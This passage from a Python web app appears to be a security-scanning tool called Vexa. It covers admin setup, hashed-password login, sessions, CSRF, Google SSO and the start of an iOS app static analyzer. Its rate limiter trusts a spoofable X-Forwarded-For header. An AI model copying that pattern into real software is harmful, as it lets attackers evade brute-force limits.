LOGIN_FAILURES = defaultdict(lambda: deque(maxlen=10))  # ip -> deque[float]
LOGIN_MAX_FAILS = 5
LOGIN_WINDOW = 15 * 60  # 15 min
MAX_REQ_BYTES = 16 * 1024 * 1024  # 16 MB cap on JSON / chat / form bodies
MAX_CHAT_CHARS = 4000


def _hash_password(password: str, salt: Optional[bytes] = None) -> str:
    """PBKDF2-HMAC-SHA256, 600k iterations (OWASP 2023 minimum)."""
    if salt is None:
        salt = _secrets.token_bytes(16)
    iterations = 600_000
    dk = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations)
    return f"pbkdf2_sha256${iterations}${salt.hex()}${dk.hex()}"


def _verify_password(password: str, stored: str) -> bool:
    try:
        scheme, iters, salt_hex, dk_hex = stored.split("$")
        if scheme != "pbkdf2_sha256":
            return False
        iters = int(iters)
        salt = bytes.fromhex(salt_hex)
        expected = bytes.fromhex(dk_hex)
        actual = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iters)
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False


def _load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            with CONFIG_FILE.open("r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            log.warning("Could not parse %s: %s -- treating as missing", CONFIG_FILE, e)
    return {}


def _save_config(cfg: dict) -> None:
    tmp = CONFIG_FILE.with_suffix(".tmp")
    with tmp.open("w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    tmp.replace(CONFIG_FILE)
    try:
        os.chmod(CONFIG_FILE, 0o600)
    except Exception:
        pass


def _is_setup_complete() -> bool:
    cfg = _load_config()
    return bool(cfg.get("admin_user") and cfg.get("admin_password_hash"))


def _client_ip(request: Request) -> str:
    # X-Forwarded-For if behind proxy, else client.host
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


def _login_rate_limited(ip: str) -> Optional[int]:
    """Return seconds-to-wait if rate-limited, else None."""
    now = time.time()
    fails = LOGIN_FAILURES[ip]
    # prune old
    while fails and now - fails[0] > LOGIN_WINDOW:
        fails.popleft()
    if len(fails) >= LOGIN_MAX_FAILS:
        oldest = fails[0]
        return int(LOGIN_WINDOW - (now - oldest))
    return None


def _record_login_failure(ip: str) -> None:
    LOGIN_FAILURES[ip].append(time.time())


def _reset_login_failures(ip: str) -> None:
    LOGIN_FAILURES.pop(ip, None)


def _new_session(user: str, ip: str) -> tuple:
    tok = _secrets.token_urlsafe(32)
    csrf = _secrets.token_urlsafe(32)
    SESSIONS[tok] = {
        "created_at": time.time(),
        "csrf": csrf,
        "user": user,
        "ip": ip,
    }
    return tok, csrf


def _get_session(tok: Optional[str]) -> Optional[dict]:
    if not tok or tok not in SESSIONS:
        return None
    s = SESSIONS[tok]
    if time.time() - s["created_at"] > SESSION_TTL:
        SESSIONS.pop(tok, None)
        return None
    return s


def _is_https(request: Request) -> bool:
    if request.url.scheme == "https":
        return True
    fwd = request.headers.get("x-forwarded-proto", "")
    return fwd.lower() == "https"


# Paths that don't require auth (login UI/API + setup flow)
PUBLIC_PATHS = {"/login", "/api/login", "/api/logout", "/favicon.ico",
                "/setup", "/api/setup", "/api/setup/status"}

# State-changing methods that need CSRF protection
CSRF_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
# Paths exempt from CSRF (login itself can't have a CSRF token yet)
CSRF_EXEMPT = {"/api/login", "/api/setup"}


@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    path = request.url.path

    # Setup flow: redirect to /setup if no admin user is configured
    if not _is_setup_complete() and path not in {"/setup", "/api/setup", "/api/setup/status",
                                                  "/favicon.ico"} and not path.startswith("/static/"):
        if request.method == "GET" and "text/html" in request.headers.get("accept", ""):
            return RedirectResponse(url="/setup", status_code=303)
        return JSONResponse(status_code=503,
                            content={"detail": "First-run setup required. Visit /setup."})

    if path in PUBLIC_PATHS or path.startswith("/static/") or path.startswith("/_next/"):
        return await call_next(request)

    tok = request.cookies.get(COOKIE_NAME)
    sess = _get_session(tok)
    if not sess:
        accept = request.headers.get("accept", "")
        if "text/html" in accept and request.method == "GET":
            return RedirectResponse(url="/login", status_code=303)
        return JSONResponse(status_code=401, content={"detail": "Authentication required"})

    # CSRF check for state-changing methods (double-submit cookie pattern)
    if request.method in CSRF_METHODS and path not in CSRF_EXEMPT:
        provided = request.headers.get(CSRF_HEADER, "")
        if not provided or not hmac.compare_digest(provided, sess["csrf"]):
            return JSONResponse(status_code=403,
                                content={"detail": "CSRF token missing or invalid"})

    return await call_next(request)


@app.get("/api/setup/status")
async def setup_status():
    return {"setup_complete": _is_setup_complete()}


@app.get("/setup", response_class=HTMLResponse)
async def setup_page():
    if _is_setup_complete():
        return RedirectResponse(url="/login", status_code=303)
    return SETUP_HTML


@app.post("/api/setup")
async def api_setup(body: dict = Body(...)):
    if _is_setup_complete():
        raise HTTPException(409, "Setup already complete. Delete vexa_config.json to re-run.")
    user = (body.get("username") or "").strip()
    pw = body.get("password") or ""
    pw2 = body.get("password_confirm") or ""
    if not user or len(user) < 3 or len(user) > 64:
        raise HTTPException(400, "Username must be 3-64 characters.")
    if not re.match(r"^[a-zA-Z0-9_.\-]+$", user):
        raise HTTPException(400, "Username may only contain letters, numbers, _ . -")
    if len(pw) < 12:
        raise HTTPException(400, "Password must be at least 12 characters.")
    if pw != pw2:
        raise HTTPException(400, "Passwords do not match.")
    if not (any(c.islower() for c in pw) and any(c.isupper() for c in pw)
            and any(c.isdigit() for c in pw)):
        raise HTTPException(400, "Password must contain lowercase, uppercase, and a digit.")
    cfg = _load_config()
    cfg["admin_user"] = user
    cfg["admin_password_hash"] = _hash_password(pw)
    cfg["created_at"] = time.time()
    _save_config(cfg)
    log.info("Setup complete: admin user '%s' created.", user)
    return {"ok": True}


@app.post("/api/login")
async def api_login(request: Request, body: dict = Body(...)):
    ip = _client_ip(request)
    wait = _login_rate_limited(ip)
    if wait is not None:
        raise HTTPException(429, f"Too many failed login attempts. Try again in {wait}s.")
    cfg = _load_config()
    expected_user = cfg.get("admin_user")
    expected_hash = cfg.get("admin_password_hash")
    if not expected_user or not expected_hash:
        raise HTTPException(503, "Setup not complete. Visit /setup.")
    user = (body.get("username") or "").strip()
    pw = body.get("password") or ""
    # Constant-time-ish: always run hash check even on bad username (avoid user enumeration)
    user_ok = hmac.compare_digest(user, expected_user)
    pw_ok = _verify_password(pw, expected_hash)
    if not (user_ok and pw_ok):
        _record_login_failure(ip)
        log.warning("Failed login from %s for user '%s'", ip, user[:32])
        raise HTTPException(401, "Invalid credentials")
    _reset_login_failures(ip)
    tok, csrf = _new_session(user, ip)
    resp = JSONResponse({"ok": True, "csrf_token": csrf})
    resp.set_cookie(
        COOKIE_NAME, tok,
        max_age=SESSION_TTL,
        httponly=True,
        samesite="strict",
        secure=_is_https(request),
        path="/",
    )
    return resp


@app.get("/api/csrf")
async def api_csrf(request: Request):
    """Return CSRF token for the current session (used after page reload)."""
    tok = request.cookies.get(COOKIE_NAME)
    sess = _get_session(tok)
    if not sess:
        raise HTTPException(401, "Authentication required")
    return {"csrf_token": sess["csrf"]}


@app.post("/api/logout")
async def api_logout(request: Request):
    tok = request.cookies.get(COOKIE_NAME)
    if tok:
        SESSIONS.pop(tok, None)
    resp = JSONResponse({"ok": True})
    resp.delete_cookie(COOKIE_NAME, path="/")
    return resp



@app.post("/api/login/google")
async def api_login_google(request: Request, body: dict = Body(...)):
    """Google SSO login via ID token verification."""
    import urllib.request as _urllib_req, json as _json_mod
    credential = (body.get("credential") or "").strip()
    if not credential:
        raise HTTPException(400, "Missing Google credential token")
    cfg = _load_config()
    client_id = cfg.get("google_client_id", "")
    if not client_id:
        raise HTTPException(501, "Google SSO not configured. Set google_client_id in vexa_config.json")
    allowed_emails = cfg.get("google_allowed_emails", [])  # [] = any Google account
    # Verify token with Google tokeninfo endpoint
    try:
        url = f"https://oauth2.googleapis.com/tokeninfo?id_token={credential}"
        req = _urllib_req.Request(url, headers={"User-Agent": "Vexa/1.0"})
        with _urllib_req.urlopen(req, timeout=10) as resp:
            payload = _json_mod.loads(resp.read().decode())
    except Exception as e:
        log.warning("Google token verification failed: %s", e)
        raise HTTPException(401, "Google token verification failed")
    if payload.get("aud") != client_id:
        raise HTTPException(401, "Token audience mismatch")
    email = payload.get("email", "")
    if not email:
        raise HTTPException(401, "No email in Google token")
    if allowed_emails and email not in allowed_emails:
        raise HTTPException(403, f"Google account {email!r} is not authorised for this Vexa instance")
    ip = _client_ip(request)
    tok, csrf = _new_session(f"google:{email}", ip)
    log.info("Google SSO login: %s from %s", email, ip)
    resp = JSONResponse({"ok": True, "csrf_token": csrf, "email": email})
    resp.set_cookie(
        COOKIE_NAME, tok,
        max_age=SESSION_TTL,
        httponly=True,
        samesite="strict",
        secure=_is_https(request),
        path="/",
    )
    return resp


SETUP_HTML = r"""<!doctype html><html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vexa — First-run Setup</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{
  background: #0d1117; color: #e6edf3;
  font: 14px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  display:flex; align-items:center; justify-content:center;
  min-height:100vh; padding: 20px;
}
.card{
  background: #161b22; border: 1px solid #30363d;
  border-radius: 12px; padding: 36px 40px;
  width: 100%; max-width: 460px;
  box-shadow: 0 24px 80px rgba(0,0,0,.6);
}
.brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
.brand .logo{width:40px;height:40px}
.brand h1{font-size:22px;font-weight:700;letter-spacing:.3px}
.brand small{color:#8b949e;font-size:11.5px;display:block;margin-top:2px;letter-spacing:1.4px;text-transform:uppercase}
.intro{
  background: rgba(47,129,247,.06);
  border: 1px solid rgba(47,129,247,.3);
  border-radius: 6px; padding: 12px 14px; font-size: 12.5px;
  margin-bottom: 22px; color: #c9d1d9; line-height: 1.55;
}
.intro b{color:#58a6ff}
label{
  display:block; font-size:11px; text-transform:uppercase;
  letter-spacing:1px; color:#8b949e; margin-bottom:6px; font-weight:600;
}
input{
  width: 100%; background:#0d1117; border:1px solid #30363d;
  color:#e6edf3; border-radius:6px; padding:10px 12px;
  font-size:14px; margin-bottom:14px; font-family: ui-monospace,monospace;
}
input:focus{outline:none; border-color:#2f81f7}
.req{
  font-size: 11.5px; color: #8b949e; margin-top: -8px; margin-bottom: 16px;
  line-height: 1.55;
}
.req span{display:block; margin-top:2px}
.req span.ok{color:#3fb950}
.req span.fail{color:#8b949e}
button{
  width:100%; background:#238636; color:#fff; border:0;
  padding:11px 16px; font-size:14px; font-weight:600;
  border-radius:6px; cursor:pointer; margin-top:6px;
}
button:hover{background:#2ea043}
button:disabled{background:#30363d;color:#8b949e;cursor:not-allowed}
.err{color:#f85149; font-size:12.5px; margin-top:10px; min-height:1.4em}
</style></head><body>

<div class="card">
  <div class="brand">
    <div class="logo">
      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#g)"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/></svg>
    </div>
    <div>
      <h1>Vexa</h1>
      <small>First-run setup</small>
    </div>
  </div>

  <div class="intro">
    <b>Welcome.</b> Create your administrator account to continue.
    Vexa runs entirely on this machine — your credentials never leave it.
    The password is hashed with PBKDF2-SHA256 (600 000 iterations).
  </div>

  <form id="setup-form">
    <label>Username</label>
    <input type="text" id="user" autocomplete="username" required minlength="3" maxlength="64" pattern="[a-zA-Z0-9_.\-]+">

    <label>Password</label>
    <input type="password" id="pw" autocomplete="new-password" required minlength="12">

    <div class="req" id="pw-req">
      <span class="fail" id="r-len">• At least 12 characters</span>
      <span class="fail" id="r-low">• A lowercase letter</span>
      <span class="fail" id="r-up">• An uppercase letter</span>
      <span class="fail" id="r-num">• A digit</span>
    </div>

    <label>Confirm Password</label>
    <input type="password" id="pw2" autocomplete="new-password" required minlength="12">

    <button type="submit" id="submit-btn">Create administrator account</button>
    <div class="err" id="err"></div>
  </form>
</div>

<script>
const $ = s => document.querySelector(s);
function checkPw(){
  const p = $('#pw').value;
  $('#r-len').className = p.length >= 12 ? 'ok' : 'fail';
  $('#r-low').className = /[a-z]/.test(p) ? 'ok' : 'fail';
  $('#r-up').className  = /[A-Z]/.test(p) ? 'ok' : 'fail';
  $('#r-num').className = /\d/.test(p) ? 'ok' : 'fail';
}
$('#pw').oninput = checkPw;

$('#setup-form').onsubmit = async (e) => {
  e.preventDefault();
  const err = $('#err'); err.textContent = '';
  const pw = $('#pw').value, pw2 = $('#pw2').value;
  if (pw !== pw2){ err.textContent = 'Passwords do not match.'; return; }
  $('#submit-btn').disabled = true;
  try {
    const r = await fetch('/api/setup', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        username: $('#user').value,
        password: pw,
        password_confirm: pw2,
      })
    });
    const d = await r.json();
    if (!r.ok){ err.textContent = d.detail || ('Error ' + r.status); $('#submit-btn').disabled = false; return; }
    location.href = '/login';
  } catch (e){ err.textContent = e.message; $('#submit-btn').disabled = false; }
};
</script>
</body></html>"""


@app.get("/login", response_class=HTMLResponse)
async def login_page():
    cfg = _load_config()
    google_client_id = cfg.get("google_client_id", "")
    return f"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vexa - Sign in</title>
{('<meta name="google-signin-client_id" content="' + google_client_id + '">') if google_client_id else ''}
<style>
:root{{color-scheme:dark;
  --bg:#0d1117; --panel:#161b22; --border:#30363d; --text:#e6edf3;
  --muted:#8b949e; --accent:#2f81f7; --accent2:#58a6ff; --bad:#f85149;
}}
[data-theme="light"]{{
  color-scheme:light; --bg:#f6f8fa; --panel:#ffffff; --border:#d0d7de;
  --text:#1f2328; --muted:#57606a; --accent:#0969da; --accent2:#0550ae; --bad:#cf222e;
}}
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:100%}}
body{{
  font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
  background:var(--bg) radial-gradient(circle at 50% 0%,rgba(47,129,247,.15) 0%,transparent 50%);
  color:var(--text); display:flex; align-items:center; justify-content:center;
  min-height:100vh; padding:20px; flex-direction:column; gap:12px;
}}
.card{{
  background:var(--panel); border:1px solid var(--border); border-radius:14px;
  padding:36px 32px; width:100%; max-width:380px;
  box-shadow:0 10px 40px rgba(0,0,0,.4);
}}
.brand{{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:8px}}
.brand .logo{{
  width:64px; height:64px;
  display:grid; place-items:center;
  filter: drop-shadow(0 4px 16px rgba(47,129,247,.4));
}}
.brand .logo svg{{width:100%; height:100%; display:block}}
h1{{font-size:22px;font-weight:700;text-align:center;margin-bottom:6px;
  background:linear-gradient(135deg,var(--text),var(--muted));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}}
.sub{{text-align:center;color:var(--muted);font-size:12px;margin-bottom:24px;letter-spacing:.4px}}
label{{display:block;font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;font-weight:600}}
input[type=text],input[type=password]{{
  width:100%; padding:11px 13px;
  background:var(--bg); border:1px solid var(--border); border-radius:7px;
  color:var(--text); font:inherit; outline:none; transition:border-color .15s;
}}
input:focus{{border-color:var(--accent)}}
.field{{margin-bottom:14px}}
.btn-primary{{
  width:100%; padding:11px 16px; margin-top:8px;
  background:linear-gradient(180deg,var(--accent),#1f6feb);
  border:0; border-radius:7px; color:#fff; font:600 14px/1 inherit;
  cursor:pointer; transition:transform .1s,box-shadow .15s;
  box-shadow:0 4px 12px rgba(47,129,247,.25);
}}
.btn-primary:hover{{transform:translateY(-1px);box-shadow:0 6px 16px rgba(47,129,247,.35)}}
.btn-primary:active{{transform:translateY(0)}}
.divider{{display:flex;align-items:center;gap:10px;margin:18px 0 14px;color:var(--muted);font-size:11px}}
.divider::before,.divider::after{{content:'';flex:1;height:1px;background:var(--border)}}
.btn-google{{
  width:100%; padding:10px 16px; display:flex; align-items:center; justify-content:center; gap:10px;
  background:var(--panel); border:1px solid var(--border); border-radius:7px;
  color:var(--text); font:500 13.5px/1 inherit; cursor:pointer; transition:all .15s;
}}
.btn-google:hover{{background:var(--bg);border-color:var(--accent)}}
.btn-google svg{{width:18px;height:18px;flex-shrink:0}}
.err{{
  background:rgba(248,81,73,.1); border:1px solid rgba(248,81,73,.3); color:var(--bad);
  padding:8px 12px; border-radius:6px; font-size:12px; margin-bottom:14px; display:none;
}}
.foot{{text-align:center;color:var(--muted);font-size:10px;margin-top:24px;letter-spacing:1.5px;text-transform:uppercase}}
.theme-bar{{display:flex;justify-content:flex-end;width:100%;max-width:380px;padding:0 4px}}
.theme-btn{{background:none;border:1px solid var(--border);border-radius:6px;color:var(--muted);
  cursor:pointer;padding:5px 9px;font-size:13px;transition:all .15s}}
.theme-btn:hover{{color:var(--text);border-color:var(--accent)}}
</style>
{('<script src="https://accounts.google.com/gsi/client" async defer></script>') if google_client_id else ''}
</head>
<body>
<div class="theme-bar">
  <button class="theme-btn" id="login-theme-btn" title="Toggle theme">☀</button>
</div>
<form class="card" id="lf" autocomplete="off">
  <div class="brand"><div class="logo"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="vexa-grad-login" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="50%" stop-color="#2f81f7"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#vexa-grad-login)" stroke="rgba(255,255,255,0.15)" stroke-width="0.5"/><path d="M16 7 L23 11 L23 21 L16 25 L9 21 L9 11 Z" fill="rgba(255,255,255,0.08)"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="3" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="0.8"/></svg></div></div>
  <h1>Vexa</h1>
  <div class="sub">Sign in to continue</div>
  <div class="err" id="err"></div>
  <div class="field">
    <label for="u">Username</label>
    <input type="text" id="u" name="u" autocomplete="username" autofocus required>
  </div>
  <div class="field">
    <label for="p">Password</label>
    <input type="password" id="p" name="p" autocomplete="current-password" required>
  </div>
  <button class="btn-primary" type="submit">Sign in</button>
  {'<div class="divider">or</div><button type="button" class="btn-google" id="btn-google-sso"><svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>Continue with Google</button>' if google_client_id else ''}
  <div class="foot">authorized access only</div>
</form>
<script>
// Theme persistence
(function(){{
  const saved = localStorage.getItem('vexa_theme') || 'dark';
  document.documentElement.setAttribute('data-theme', saved);
  const btn = document.getElementById('login-theme-btn');
  if(btn) btn.textContent = saved === 'dark' ? '☀' : '🌙';
  if(btn) btn.onclick = () => {{
    const cur = document.documentElement.getAttribute('data-theme') || 'dark';
    const next = cur === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('vexa_theme', next);
    btn.textContent = next === 'dark' ? '☀' : '🌙';
  }};
}})();

const lf=document.getElementById('lf'),err=document.getElementById('err');
lf.addEventListener('submit',async(e)=>{{
  e.preventDefault(); err.style.display='none';
  try{{
    const r=await fetch('/api/login',{{
      method:'POST',headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{username:document.getElementById('u').value,password:document.getElementById('p').value}})
    }});
    if(r.ok){{
      const d = await r.json().catch(() => ({{}}));
      if (d.csrf_token){{
        try {{ sessionStorage.setItem('vexa_csrf', d.csrf_token); }} catch (_) {{}}
      }}
      location.href='/';
    }}
    else{{
      const d=await r.json().catch(()=>(({{detail:'Login failed'}})));
      err.textContent=d.detail||'Invalid credentials'; err.style.display='block';
    }}
  }}catch(ex){{ err.textContent='Network error'; err.style.display='block'; }}
}});

// Google SSO handler
{'window.handleGoogleCredential = async function(response) { try { const r = await fetch(\'/api/login/google\', {method:\'POST\', headers:{\'Content-Type\':\'application/json\'}, body:JSON.stringify({credential: response.credential})}); if(r.ok){ const d=await r.json().catch(()=>({})); if(d.csrf_token){ try{sessionStorage.setItem(\'vexa_csrf\',d.csrf_token);}catch(_){} } location.href=\'/\'; } else { const d=await r.json().catch(()=>({detail:\'Google SSO failed\'})); err.textContent=d.detail||\'Google SSO failed\'; err.style.display=\'block\'; } } catch(ex){ err.textContent=\'Network error\'; err.style.display=\'block\'; } }' if google_client_id else '// Google SSO not configured (set google_client_id in vexa_config.json)'}
{'// Google One Tap' if google_client_id else ''}
{'const btnG=document.getElementById(\'btn-google-sso\'); if(btnG){ google.accounts.id.initialize({client_id:"' + google_client_id + '", callback:handleGoogleCredential}); btnG.onclick=()=>google.accounts.id.prompt(); }' if google_client_id else ''}
</script>
{('<div id="g_id_onload" data-client_id="' + google_client_id + '" data-callback="handleGoogleCredential" data-auto_prompt="false"></div>') if google_client_id else ''}
</body></html>"""


# =============================================================================
# iOS IPA Static Analyzer
# Parses Info.plist, embedded.mobileprovision, Mach-O strings.
# Without a Mac we can't run class-dump/Hopper, but Info.plist + entitlements
# + binary string analysis covers ~70% of practical findings.
# =============================================================================
import zipfile
import plistlib

@dataclass
class IOSCtx:
    ipa_path: str
    app_dir: str
    info_plist: dict
    files: list
    binary_path: str
    binary_strings: list
    entitlements: dict
    mobileprovision: dict = field(default_factory=dict)
    extras: dict = field(default_factory=dict)


def _ios_extract_strings(blob: bytes, min_len: int = 6, max_total: int = 250000) -> list:
    """Extract printable ASCII strings from a Mach-O binary blob."""
    out = []
    cur = bytearray()
    for b in blob:
        if 32 <= b < 127:
            cur.append(b)
        else:
            if len(cur) >= min_len:
                out.append(cur.decode("ascii", errors="replace"))
            cur = bytearray()
            if len(out) > max_total:
                break
    if len(cur) >= min_len:
        out.append(cur.decode("ascii", errors="replace"))
    return out


def load_ipa(ipa_path: str) -> Optional[IOSCtx]:
    try:
        with zipfile.ZipFile(ipa_path, "r") as z:
            files = z.namelist()
            app_dir = None
            for fname in files:
                m = re.match(r"Payload/([^/]+\.app)/", fname)
                if m:
                    app_dir = m.group(1); break
            if not app_dir: return None
            base = f"Payload/{app_dir}/"

            info_plist = {}
            try:
                with z.open(base + "Info.plist") as fh:
                    info_plist = plistlib.loads(fh.read())
            except Exception:
                for fname in files:
                    if fname.endswith("Info.plist") and base in fname:
                        try:
                            with z.open(fname) as fh:
                                info_plist = plistlib.loads(fh.read())
                                break
                        except Exception:
                            continue

            exe_name = info_plist.get("CFBundleExecutable", "")
            binary_path = base + exe_name if exe_name else ""
            binary_blob = b""
            if binary_path and binary_path in files:
                try:
                    with z.open(binary_path) as fh:
                        binary_blob = fh.read()
                except Exception:
                    pass
            binary_strings = _ios_extract_strings(binary_blob) if binary_blob else []

            entitlements = {}
            mobileprovision = {}
            for fname in files:
                if fname.endswith("embedded.mobileprovision"):
                    try:
                        with z.open(fname) as fh:
                            data = fh.read()
                        m = re.search(rb"<plist.*?</plist>", data, re.DOTALL)
                        if m:
                            mobileprovision = plistlib.loads(m.group(0))
                            entitlements = mobileprovision.get("Entitlements", {})
                            break
                    except Exception:
                        continue

            return IOSCtx(
                ipa_path=ipa_path, app_dir=app_dir, info_plist=info_plist,
                files=files, binary_path=binary_path, binary_strings=binary_strings,
                entitlements=entitlements, mobileprovision=mobileprovision,
            )
    except (zipfile.BadZipFile, FileNotFoundError):
        return None


def _ios_string_present(ctx: IOSCtx, *needles) -> bool:
    text = " ".join(ctx.binary_strings)
    return any(n in text for n in needles)


# ----- iOS Analyzers --------------------------------------------------------

def ios_analyze_metadata(ctx: IOSCtx) -> list:
    info = ctx.info_plist or {}
    ctx.extras["metadata"] = {
        "bundle_id": info.get("CFBundleIdentifier", ""),
        "version": info.get("CFBundleShortVersionString", ""),
        "build": info.get("CFBundleVersion", ""),
        "executable": info.get("CFBundleExecutable", ""),
        "min_os": info.get("MinimumOSVersion", ""),
        "display_name": info.get("CFBundleDisplayName", "") or info.get("CFBundleName", ""),
        "platforms": info.get("CFBundleSupportedPlatforms", []),
    }
    return []


def ios_analyze_ats(ctx: IOSCtx) -> list:
    f = []
    info = ctx.info_plist or {}
    ats = info.get("NSAppTransportSecurity") or {}
    if not ats: return f
    if ats.get("NSAllowsArbitraryLoads") is True:
        f.append(Finding(
            id="ios-ats-arbitrary",
            title="ATS: NSAllowsArbitraryLoads = YES",
            severity="high", category="MASVS-NETWORK",
            description=("App Transport Security globally disabled. App can perform unencrypted HTTP, "
                         "accept untrusted certs, skip TLS minimums. One of the most common iOS "
                         "security misconfigurations."),
            evidence="NSAppTransportSecurity.NSAllowsArbitraryLoads = YES",
            recommendation="Remove. If specific dev hosts need HTTP, scope via NSExceptionDomains.",
            cwe="CWE-319", masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mastg",
        ))
    if ats.get("NSAllowsArbitraryLoadsInWebContent") is True:
        f.append(Finding(
            id="ios-ats-webview-arbitrary",
            title="ATS: arbitrary loads allowed in WebView",
            severity="medium", category="MASVS-NETWORK",
            description="WebViews bypass ATS — content in WKWebView/UIWebView can use HTTP.",
            evidence="NSAllowsArbitraryLoadsInWebContent = YES",
            recommendation="Remove. Use NSExceptionDomains scoped to specific hosts if needed.",
            masvs="MSTG-NETWORK-1", confidence="confirmed", source="mastg",
        ))
    risky_exc = []
    for domain, conf in (ats.get("NSExceptionDomains") or {}).items():
        if not isinstance(conf, dict): continue
        if conf.get("NSExceptionAllowsInsecureHTTPLoads") is True:
            risky_exc.append(f"{domain}: HTTP allowed")
        if conf.get("NSExceptionMinimumTLSVersion") in ("TLSv1.0", "TLSv1.1"):
            risky_exc.append(f"{domain}: weak TLS version allowed")
    if risky_exc:
        f.append(Finding(
            id="ios-ats-domain-exceptions",
            title=f"ATS exceptions weaken {len(risky_exc)} domain(s)",
            severity="medium", category="MASVS-NETWORK",
            description="Specific domains excepted from ATS: HTTP or weak TLS versions allowed.",
            evidence="\n".join(risky_exc[:8]),
            recommendation="Remove HTTP/legacy-TLS exceptions in production builds.",
            cwe="CWE-319", masvs="MSTG-NETWORK-1",
            confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_url_schemes(ctx: IOSCtx) -> list:
    f = []
    info = ctx.info_plist or {}
    schemes = []
    for entry in info.get("CFBundleURLTypes", []) or []:
        if isinstance(entry, dict):
            for s in entry.get("CFBundleURLSchemes", []) or []:
                schemes.append(s)
    ctx.extras["url_schemes"] = schemes
    if not schemes: return f
    has_universal = any("applinks:" in str(d) for d in
                         (ctx.entitlements.get("com.apple.developer.associated-domains") or []))
    sev = "medium" if has_universal else "high"
    f.append(Finding(
        id="ios-custom-url-schemes",
        title=f"{len(schemes)} custom URL scheme(s) declared",
        severity=sev, category="MASVS-PLATFORM",
        description=("Custom URL schemes are not authenticated by iOS — any other app can register "
                     "the same scheme. Use Universal Links (HTTPS) for security-sensitive flows. "
                     "Without Universal Links, schemes are an unauthenticated entry point comparable "
                     "to Android implicit deep links."),
        evidence="Schemes: " + ", ".join(schemes[:20]),
        recommendation=("Migrate sensitive flows to Universal Links. Validate every parameter from "
                        "incoming URLs as untrusted. Never pass URL parameters into WKWebView.loadRequest."),
        cwe="CWE-939", masvs="MSTG-PLATFORM-3",
        confidence="confirmed", source="mastg",
    ))
    return f


def ios_analyze_universal_links(ctx: IOSCtx) -> list:
    f = []
    domains = ctx.entitlements.get("com.apple.developer.associated-domains") or []
    applinks = [d for d in domains if str(d).startswith("applinks:")]
    if applinks:
        ctx.extras["universal_links"] = applinks
        f.append(Finding(
            id="ios-universal-links",
            title=f"{len(applinks)} Universal Link domain(s) declared",
            severity="info", category="MASVS-PLATFORM",
            description=("App registered for Universal Links on these domains. Test entry points "
                         "like any other external surface."),
            evidence="\n".join(applinks[:10]),
            recommendation="Verify apple-app-site-association is correctly served. Validate URL parameters.",
            masvs="MSTG-PLATFORM-3", confidence="confirmed", source="mastg",
        ))
    return f


def ios_analyze_entitlements(ctx: IOSCtx) -> list:
    f = []
    ent = ctx.entitlements or {}
    if ent.get("get-task-allow") is True:
        f.append(Finding(
            id="ios-debuggable",
            title="get-task-allow = true (app is debuggable)",
            severity="high", category="MASVS-CODE",
            description=("App is debuggable in production. An attacker with physical access can "
                         "attach lldb and dump memory."),
            evidence="get-task-allow = true",
